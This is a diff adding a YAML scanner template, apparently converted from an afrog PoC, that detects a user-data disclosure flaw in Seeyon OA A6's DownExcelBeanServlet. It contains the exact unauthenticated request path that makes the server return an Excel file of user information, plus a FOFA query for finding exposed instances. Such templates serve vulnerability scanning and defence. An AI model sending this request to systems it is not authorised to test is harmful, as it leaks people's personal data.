@@ -1,0 +1,27 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '[Content_Types].xml'
+          - Excel.Sheet
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0'
+id: seeyon-a6-downexcelbeansevlet-disclosure
+info:
+  author: sakura404x
+  description: 'fofa: app="致远互联-OA"'
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 致远OA A6 DownExcelBeanServlet 用户敏感信息泄露
+  severity: high
+  tags: seeyon,disclosure,argus-import
